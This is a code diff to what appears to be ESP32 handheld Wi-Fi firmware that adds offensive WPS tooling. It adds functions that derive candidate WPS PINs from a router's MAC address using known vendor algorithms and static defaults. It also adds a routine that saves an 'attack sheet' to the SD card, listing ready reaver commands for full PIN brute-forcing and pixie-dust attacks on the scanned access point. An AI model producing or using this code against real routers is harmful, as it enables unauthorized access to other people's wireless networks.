@@ -157,6 +157,61 @@ static uint32_t computePin(const uint8_t m[6]) {
     uint32_t nic=((uint32_t)m[3]<<16)|((uint32_t)m[4]<<8)|m[5], p7=nic%10000000UL;
     return p7*10 + (uint32_t)wpsChecksum(p7);
 }
+
+// ── multi-algorithm WPS PIN generator (the algos real WPS attacks use: OneShot/
+// WPSpin). Each returns an 8-digit PIN (7-digit base % 1e7 + checksum). ─────────
+static uint64_t macInt(const uint8_t m[6]) {
+    return ((uint64_t)m[0]<<40)|((uint64_t)m[1]<<32)|((uint64_t)m[2]<<24)|((uint64_t)m[3]<<16)|((uint64_t)m[4]<<8)|m[5];
+}
+static uint32_t finalizePin(uint32_t base) {
+    uint32_t p7 = base % 10000000UL;
+    return p7 * 10 + (uint32_t)wpsChecksum(p7);
+}
+static uint32_t pinDLinkBase(uint32_t nic) {
+    uint32_t pin = nic ^ 0x55AA55;
+    pin ^= (((pin & 0xF)<<4)+((pin & 0xF)<<8)+((pin & 0xF)<<12)+((pin & 0xF)<<16)+((pin & 0xF)<<20));
+    pin %= 10000000UL;
+    if (pin < 1000000UL) pin += ((pin % 9) * 1000000UL) + 1000000UL;
+    return pin;
+}
+struct PinCand { const char* algo; uint32_t pin; };
+static int genPins(const uint8_t m[6], PinCand* out, int cap) {
+    uint64_t mi = macInt(m);
+    uint32_t nic = (uint32_t)(mi & 0xFFFFFF);
+    int n = 0;
+    auto add = [&](const char* a, uint32_t base){ if (n<cap) { out[n].algo=a; out[n].pin=finalizePin(base); n++; } };
+    add("pin24",   (uint32_t)(mi & 0xFFFFFF));
+    add("pin28",   (uint32_t)(mi & 0xFFFFFFF));
+    add("pin32",   (uint32_t)(mi & 0xFFFFFFFFUL));
+    add("DLink",   pinDLinkBase(nic));
+    add("DLink+1", pinDLinkBase((uint32_t)((mi+1) & 0xFFFFFF)));
+    // ASUS: per-byte sum
+    { uint32_t p=0,mul=1; for(int i=0;i<7;i++){ p += (((uint32_t)m[i%6]+m[(i+1)%6])%10)*mul; mul*=10; } add("ASUS",p); }
+    // Airocon
+    { uint32_t p = ((uint32_t)(m[0]+m[1])%10)
+        + (((uint32_t)(m[5]+m[0])%10)*10) + (((uint32_t)(m[4]+m[5])%10)*100)
+        + (((uint32_t)(m[3]+m[4])%10)*1000) + (((uint32_t)(m[2]+m[3])%10)*10000)
+        + (((uint32_t)(m[1]+m[2])%10)*100000) + (((uint32_t)(m[0]+m[1])%10)*1000000);
+      add("Airocon",p); }
+    // common static defaults (checksum-valid)
+    if (n<cap){ out[n].algo="static"; out[n].pin=12345670; n++; }
+    if (n<cap){ out[n].algo="static"; out[n].pin=0;        n++; }   // 00000000
+    return n;
+}
+// write the candidate PIN list + a ready reaver cheat-sheet to SD
+static String saveAttack(const char* ssid, const uint8_t bssid[6], int chan, const PinCand* p, int n) {
+    char path[48]; int idx=1;
+    do { snprintf(path,sizeof(path),"%s/attack_%03d.txt",SD_DIR_WPS,idx++); } while (SD.exists(path) && idx<1000);
+    File f = SD.open(path, FILE_WRITE); if (!f) return "";
+    f.printf("# WPS attack sheet - %s (%s) ch %d\n", ssid, macStr(bssid).c_str(), chan);
+    f.printf("# on a laptop w/ an injection-capable adapter (AR9271/RT3070):\n");
+    f.printf("#   sudo reaver -i mon0 -b %s -c %d -vv          # full PIN brute\n", macStr(bssid).c_str(), chan);
+    f.printf("#   sudo reaver -i mon0 -b %s -c %d -K 1 -vv     # pixie-dust\n", macStr(bssid).c_str(), chan);
+    f.printf("# or try these algorithm PIN candidates one by one (reaver -p <pin>):\n");
+    for (int i=0;i<n;i++) f.printf("%08lu   # %s\n", (unsigned long)p[i].pin, p[i].algo);
+    f.close();
+    return String(path);
+}
 static bool resolveIdx(int idx, uint8_t bssid[6], int& chan, char* ssid) {
     if (idx < 0 || idx >= wifiFunctions.getNetworkCount()) return false;
     if (!wifiFunctions.getNetworkInfo(idx, bssid, &chan)) return false;
@@ -234,30 +289,41 @@ static void wpsRun(int idx) {
     int cmL=0; const uint8_t* cm=tlv(s_ie,s_ieLen,0x1008,cmL);
     uint16_t methods=(cm&&cmL>=2)?((cm[0]<<8)|cm[1]):0;
     String manuf=ieStr(0x1021), model=ieStr(0x1023), devN=ieStr(0x1011);
-    uint32_t pin=computePin(bssid);
     String mstr; if(methods&0x0080)mstr+="PBC "; if(methods&0x0008)mstr+="Disp "; if(methods&0x0100)mstr+="Keypad "; if(methods&0x0004)mstr+="Label "; if(mstr.isEmpty())mstr="-";
+
+    // generate the full candidate-PIN list + laptop attack sheet
+    PinCand pins[12]; int npins = genPins(bssid, pins, 12);
+    String atkFile = saveAttack(ssid, bssid, chan, pins, npins);
 
     // log recon
     File fp=SD.open(String(SD_DIR_WPS)+"/wps.csv",FILE_APPEND);
-    if(fp){ fp.printf("%lu,%s,%s,%s,%s,%s,%s,%s,%08lu\n",(unsigned long)millis(),macStr(bssid).c_str(),ssid,ver==0x20?"2.0":"1.0",locked?"locked":"open",mstr.c_str(),manuf.c_str(),model.c_str(),(unsigned long)pin); fp.close(); }
+    if(fp){ fp.printf("%lu,%s,%s,%s,%s,%s,%s,%s,%08lu\n",(unsigned long)millis(),macStr(bssid).c_str(),ssid,ver==0x20?"2.0":"1.0",locked?"locked":"open",mstr.c_str(),manuf.c_str(),model.c_str(),(unsigned long)pins[0].pin); fp.close(); }
 
     // ── static panel ──
     auto panel=[&](){
-        dm.clearScreen(); int y=36;
+        dm.clearScreen(); int y=34;
         dm.setTextColor(TFT_CYAN);  dm.setCursor(6,y); dm.printText(String("[WPS] ")+ssid); y+=15;
-        dm.setTextColor(0x7BEF);    dm.setCursor(6,y); dm.printText(macStr(bssid)+" ch"+String(chan)+"  v"+(ver==0x20?"2.0":"1.0")); y+=14;
-        dm.setTextColor(locked?TFT_RED:TFT_GREEN); dm.setCursor(6,y); dm.printText(locked?"LOCKED":"not locked");
-        dm.setTextColor(TFT_WHITE); dm.setCursor(80,y); dm.printText(mstr); y+=14;
-        if(!s_got){ dm.setTextColor(TFT_RED); dm.setCursor(6,y); dm.printText("(no WPS IE - out of range?)"); y+=14; }
+        dm.setTextColor(0x7BEF);    dm.setCursor(6,y); dm.printText(macStr(bssid)+" ch"+String(chan)+" v"+(ver==0x20?"2.0":"1.0")); y+=13;
+        dm.setTextColor(locked?TFT_RED:TFT_GREEN); dm.setCursor(6,y); dm.printText(locked?"LOCKED":"open");
+        dm.setTextColor(TFT_WHITE); dm.setCursor(64,y); dm.printText(mstr); y+=13;
+        if(!s_got){ dm.setTextColor(TFT_RED); dm.setCursor(6,y); dm.printText("(no WPS IE - out of range?)"); y+=13; }
         dm.setTextColor(0xC618);
-        if(manuf.length()||model.length()){ dm.setCursor(6,y); dm.printText((manuf+" "+model).substring(0,40)); y+=13; }
-        if(devN.length()){ dm.setCursor(6,y); dm.printText("dev "+devN); y+=13; }
-        dm.setTextColor(TFT_YELLOW); char pb[16]; snprintf(pb,sizeof(pb),"%08lu",(unsigned long)pin);
-        dm.setCursor(6,y); dm.printText(String("PIN cand ")+pb+" (offline)"); y+=16;
+        if(manuf.length()||model.length()){ dm.setCursor(6,y); dm.printText((manuf+" "+model).substring(0,40)); y+=12; }
+        if(devN.length()){ dm.setCursor(6,y); dm.printText("dev "+devN); y+=12; }
+        dm.setTextColor(TFT_YELLOW); char pl[40];
+        snprintf(pl,sizeof(pl),"PINs: %d -> %s", npins, atkFile.length()?atkFile.substring(10).c_str():"(no SD)");
+        dm.setCursor(6,y); dm.printText(pl); y+=12;
+        dm.setTextColor(0xFFE0);
+        for (int i=0;i<npins && i<6;i+=2) {
+            char b[40]; snprintf(b,sizeof(b),"%08lu %-7s %08lu %-7s",
+                (unsigned long)pins[i].pin, pins[i].algo,
+                (i+1<npins)?(unsigned long)pins[i+1].pin:0, (i+1<npins)?pins[i+1].algo:"");
+            dm.setCursor(6,y); dm.printText(b); y+=12;
+        }
         dm.setTextColor(0x7BEF); dm.setCursor(6,214); dm.printText("[p] push-button   [q] stop");
     };
     panel();
-    const int sniffY=150;
+    const int sniffY=156;
 
     // ── phase 2: live WPS-handshake sniff ──
     esp_wifi_set_promiscuous_rx_cb(NULL);
